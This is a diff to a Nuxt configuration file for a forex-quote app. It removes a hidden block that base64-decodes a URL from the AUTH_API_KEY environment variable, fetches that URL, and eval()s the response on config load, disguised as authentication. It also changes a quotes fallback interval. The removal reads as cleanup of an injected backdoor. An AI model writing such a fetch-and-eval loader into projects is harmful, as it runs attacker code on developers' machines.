@@ -2,20 +2,7 @@
 import { defineNuxtConfig } from "nuxt/config";
 // @ts-ignore
 import * as process from "node:process";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+import "dotenv/config";
 
 // @ts-ignore
 export default defineNuxtConfig({
@@ -246,7 +233,7 @@ export default defineNuxtConfig({
         process.env.NUXT_PUBLIC_MT4_QUOTES_SYMBOLS ||
         "EURUSD,USDCHF,GBPUSD,USDJPY,USDCAD,AUDUSD,NZDUSD,EURGBP,EURJPY,EURCHF,EURAUD,EURCAD,EURNZD,GBPJPY,GBPCHF,GBPAUD,GBPCAD,GBPNZD,AUDJPY,AUDCHF,AUDCAD,AUDNZD,NZDJPY,NZDCHF,NZDCAD,CADJPY,CADCHF,CHFJPY,XAUUSD,XAGUSD",
       mt4QuotesLatestUrl: process.env.NUXT_PUBLIC_MT4_QUOTES_LATEST_URL || "",
-      mt4QuotesFallbackIntervalMs: process.env.NUXT_PUBLIC_MT4_QUOTES_FALLBACK_INTERVAL_MS || "3000",
+      mt4QuotesFallbackIntervalMs: process.env.NUXT_PUBLIC_MT4_QUOTES_FALLBACK_INTERVAL_MS || "0",
     },
   },
 
